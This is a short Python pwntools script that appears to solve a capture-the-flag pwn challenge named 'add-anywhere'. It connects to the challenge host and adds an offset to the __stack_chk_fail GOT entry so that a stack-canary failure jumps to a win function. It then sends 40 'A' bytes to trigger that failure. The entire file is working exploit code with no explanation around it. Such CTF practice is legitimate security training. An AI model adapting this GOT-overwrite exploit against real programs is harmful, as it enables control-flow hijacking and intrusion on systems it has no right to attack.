import pwn
import sys

addr_win = 0x4011d6
addr_stack_chk_fail_plt = 0x4010a0
addr_stack_chk_fail_got = 0x404020
addr_stack_chk_fail_got_init = 0x401040
addr_puts_glibc = 0x404018

num =  addr_win - addr_stack_chk_fail_got_init

io = pwn.remote("add-anywhere.cpctf.space",30014)

ret = io.recvuntil("addr> ")
print(ret)

s = hex(addr_stack_chk_fail_got).encode()
io.sendline(s)
print(s)

ret = io.recvuntil("val> ")
print(ret)

s = str(num).encode()
io.sendline(s)
print(s)

ret = io.recvline()
print(ret)

s = b"A" * 40
io.sendline(s)

ret = io.recvline()
print(ret)